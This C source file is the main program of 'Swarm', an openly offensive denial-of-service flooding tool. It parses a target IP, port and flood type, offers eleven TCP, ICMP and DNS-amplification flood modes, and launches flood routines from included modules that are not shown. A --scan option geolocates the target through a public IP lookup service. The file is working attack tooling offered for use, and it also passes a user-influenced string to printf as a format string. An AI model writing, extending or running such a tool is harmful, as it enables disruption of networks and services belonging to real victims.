#include "Main.h"

#include "Modules/TCP.c"
#include "Modules/ICMP.c"
#include "Modules/UDP.c"

#define SWARM_VERSION "Swarm 1.1.1"

//Logo Printer
void Logo()
{
    printf("\n%s ╭─────────────────────────────────────────────────────╮ \n", COLOR_RED);
    printf("%s │                                                     │ \n", COLOR_RED);
    printf("%s │    ███████╗██╗    ██╗ █████╗ ██████╗ ███╗   ███╗    │ \n", COLOR_RED);
    printf("%s │    ██╔════╝██║    ██║██╔══██╗██╔══██╗████╗ ████║    │ \n", COLOR_RED);
    printf("%s │    ███████╗██║ █╗ ██║███████║██████╔╝██╔████╔██║    │ \n", COLOR_RED);
    printf("%s │    ╚════██║██║███╗██║██╔══██║██╔══██╗██║╚██╔╝██║    │ \n", COLOR_RED);
    printf("%s │    ███████║╚███╔███╔╝██║  ██║██║  ██║██║ ╚═╝ ██║    │ \n", COLOR_RED);
    printf("%s │    ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    │ \n", COLOR_RED);
    printf("%s │                                                     │ \n", COLOR_RED);
    printf("%s ╰─────────────────────────────────────────────────────╯ \n\n", COLOR_RED);
}

//Main Function
int main(int argc, char const* argv[])
{
    Logo();
    signal(SIGINT, SignalHandler);
    
    time_t t_log = time(NULL);
    struct tm tm = *localtime(&t_log);
    
    for (int a = 0; a < argc; a++)
    {
        if(strcmp("--help", argv[a]) == 0 || strcmp("-h", argv[a]) == 0)
        {
            printf("  %sAvailable Parameters :%s\n   ├─── -h/--help : Shows This Help Page \n   ├─── -v/--version : Shows Swarm Version \n   └─── -t/--types : Shows A List Of All Flood Types \n\n", COLOR_RED, COLOR_WHITE);
            exit(0);
        }
        
        if(strcmp("--version", argv[a]) == 0 || strcmp("-v", argv[a]) == 0)
        {
            printf("               %s%s - Made By Adler\n\n", COLOR_WHITE, SWARM_VERSION);
            exit(0);
        }
        
        if(strcmp("--types", argv[a]) == 0 || strcmp("-t", argv[a]) == 0)
        {
            printf("  %sFlood Types :%s\n    ├─── Type 1 : SYN [TCP] \n    ├─── Type 2 : ACK [TCP] \n    ├─── Type 3 : SYN-ACK [TCP] \n    ├─── Type 4 : RST [TCP] \n    ├─── Type 5 : PSH [TCP] \n    ├─── Type 6 : URG [TCP] \n    ├─── Type 7 : FIN [TCP] \n    ├─── Type 8 : FIN-ACK [TCP] \n    ├─── Type 9 : E-REQUEST [ICMP] \n    ├─── Type 10 : E-REPLY [ICMP] \n    └─── Type 11 : DNS-AMP [UDP] \n\n", COLOR_RED, COLOR_WHITE);
            exit(0);
        }

        if(strcmp("--scan", argv[a]) == 0 || strcmp("-s", argv[a]) == 0)
        {
            int sd;
            struct http_message msg;
            char querylink[150];

            char query_type[20][20] = { "query", "reverse", "mobile", "proxy", "hosting", "org", "isp", "as", "asname", "continent", "continentCode", "country", "countryCode", "regionName", "region", "city", "zip", "timezone", "lat", "lon" };
            char query_name[20][30] = { "├─ Query", "├─ Reverse DNS", "├─ Mobile", "├─ Proxy", "├─ Hosting", "├─ Organisation", "├─ ISP", "├─ Autonomous System", "└─ Autonomous System Name", "├─ Continent", "├─ Continent Code", "├─ Country", "├─ Country Code", "├─ Region Name", "├─ Region", "├─ City", "├─ ZIP Code", "├─ Timezone", "├─ Latitude", "└─ Longitude" };

            printf("%s IP or Hostname %s>> %s", COLOR_WHITE, COLOR_RED, COLOR_WHITE);
            scanf("%100s", target_ip);
            printf("\n");

            printf("%s Global Informations :%s\n", COLOR_RED, COLOR_WHITE);
            for (int i = 0; i < 9; i++)
            {
                sprintf(querylink, "http://ip-api.com/csv/%s?fields=%s&lang=en", target_ip, query_type[i]);
                if ((sd = http_request(querylink)) < 1) { perror("http_request"); return -1; }
                memset(&msg, 0, sizeof(msg));
                while (http_response(sd, &msg) > 0) {
                    if (msg.content) {
                        printf("   %s : %s", query_name[i], msg.content);
                    }
                }
                close(sd);
            }

            printf("\n");

            printf("%s Geographical Informations :%s\n", COLOR_RED, COLOR_WHITE);
            for (int i = 10; i < 20; i++)
            {
                sprintf(querylink, "http://ip-api.com/csv/%s?fields=%s&lang=en", target_ip, query_type[i]);
                if ((sd = http_request(querylink)) < 1) { perror("http_request"); return -1; }
                memset(&msg, 0, sizeof(msg));
                while (http_response(sd, &msg) > 0) {
                    if (msg.content) {
                        printf("   %s : %s", query_name[i], msg.content);
                    }
                }
                close(sd);
            }

            printf("\n");

            return 0;
        }
    }
    
    if(argc < 4)
    {
        t_log = time(NULL);
        tm = *localtime(&t_log);
        printf("%s [%02d:%02d:%02d] [%sERROR%s] Incorrect Usage : ./Swarm <IPv4> <Port> <Flood Type>\n Use ' ./Swarm --help ' To Get Help.\n\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
        exit(1);
    }

    strncpy(target_ip, argv[1], 16);
    target_port = atoi(argv[2]);
    attack_mode = atoi(argv[3]);
    
    char attack_mode_str[128];
    
    switch (attack_mode)
    {
        case 1:
            strcpy(attack_mode_str, "TCP - SYN");
            break;
        case 2:
            strcpy(attack_mode_str, "TCP - ACK");
            break;
        case 3:
            strcpy(attack_mode_str, "TCP - SYN-ACK");
            break;
        case 4:
            strcpy(attack_mode_str, "TCP - RST");
            break;
        case 5:
            strcpy(attack_mode_str, "TCP - PSH");
            break;
        case 6:
            strcpy(attack_mode_str, "TCP - URG");
            break;
        case 7:
            strcpy(attack_mode_str, "TCP - FIN");
            break;
        case 8:
            strcpy(attack_mode_str, "TCP - FIN-ACK");
            break;
        case 9:
            strcpy(attack_mode_str, "ICMP - E-REQUEST");
            break;
        case 10:
            strcpy(attack_mode_str, "ICMP - E-REPLY");
            break;
        case 11:
            strcpy(attack_mode_str, "UDP - DNS Amplification");
            break;
        default:
            attack_mode = 1;
            strcpy(attack_mode_str, "TCP - SYN");
            break;
    }
    
    char target_infos[512];
    sprintf(target_infos, "%s  %sTarget Parameters :%s \n    ├── IP : %s\n    ├── Port : %d\n    └── Type : %s", COLOR_NORMAL, COLOR_RED, COLOR_WHITE, target_ip, target_port, attack_mode_str);
    printf(target_infos);
    printf("\n\n");

    t_log = time(NULL);
    tm = *localtime(&t_log);
    printf("%s [%02d:%02d:%02d] [%sINFO%s] Preparing Attack...", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_BLUE, COLOR_NORMAL);
    fflush(stdout);

    usleep(50000);

    t_log = time(NULL);
    tm = *localtime(&t_log);
    printf("\n%s [%02d:%02d:%02d] [%sSUCCESS%s] Attack Started.\n\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_GREEN, COLOR_NORMAL);

    if(attack_mode == 9 || attack_mode == 10)
        ICMPFlood();
    else if(attack_mode == 11)
        DAFlood();
    else
        TCPFlood();
       
    return 0;
}
